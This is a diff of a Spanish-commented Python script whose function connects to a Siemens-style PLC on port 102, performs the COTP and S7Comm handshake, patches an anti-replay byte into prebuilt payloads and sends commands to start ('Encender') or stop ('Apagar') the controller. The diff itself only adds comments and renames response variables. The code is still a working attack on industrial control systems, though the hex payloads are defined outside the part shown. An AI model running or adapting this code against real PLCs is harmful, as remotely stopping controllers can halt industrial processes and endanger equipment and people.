@@ -43,31 +43,37 @@ def fEncApPLC(pHostPLC, pAction):
   # Iniciar socket
   vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   vSocketConPLC.connect((pHostPLC, 102))
-  # Enviar primeros payloads
+  # Enviar payload de solicitud de comunicacion COTP
   vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
   vPayloadDeRespSolComCOTP = vSocketConPLC.recv(1024)
+  # Enviar payload de solicitud de comunicación S7Comm
   vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
   vPayloadDeRespSolComS7 = vSocketConPLC.recv(1024)
+  # Calcular el valor anti-replay
   vAntiReplay = fCalcValorAntiReplay(vPayloadDeRespSolComS7)
   if pAction == "Encender":
     print(f"Enviando payload de encendido del PLC")
+    #
     vPayloadAntiReplay  = vPayloadAntiReplay[:46]  + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
     vPayloadAntiReplay  = vPayloadAntiReplay[:47]  + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
     vPayloadEncenderPLC = vPayloadEncenderPLC[:46] + hex(vAntiReplay)[2] + vPayloadEncenderPLC[47:]
     vPayloadEncenderPLC = vPayloadEncenderPLC[:47] + hex(vAntiReplay)[3] + vPayloadEncenderPLC[48:]
     # Enviar payload de encendido
     vSocketConPLC.send(bytearray.fromhex(vPayloadEncenderPLC))
-    vPayloadDeResp = vSocketConPLC.recv(1024)
+    vPayloadDeRespEncendido = vSocketConPLC.recv(1024)
+    # Cerrar el socket
     vSocketConPLC.close()
   elif pAction == "Apagar":
     print(f"Enviando payload de apagado del PLC")
+    #
     vPayloadAntiReplay = vPayloadAntiReplay[:46] + hex(vAntiReplay)[2] + vPayloadAntiReplay[47:]
     vPayloadAntiReplay = vPayloadAntiReplay[:47] + hex(vAntiReplay)[3] + vPayloadAntiReplay[48:]
     vPayloadApagarPLC  = vPayloadApagarPLC[:46]  + hex(vAntiReplay)[2] + vPayloadApagarPLC[47:]
     vPayloadApagarPLC  = vPayloadApagarPLC[:47]  + hex(vAntiReplay)[3] + vPayloadApagarPLC[48:]
     # Enviar payload de apagado
     vSocketConPLC.send(bytearray.fromhex(vPayloadApagarPLC))
-    vPayloadDeResp = vSocketConPLC.recv(1024)
+    vPayloadDeRespApagado = vSocketConPLC.recv(1024)
+    # Cerrar el socket
     vSocketConPLC.close()
   else:
     print(f"No ha quedado claro si lo que se quiere es encender o apagar el PLC.")
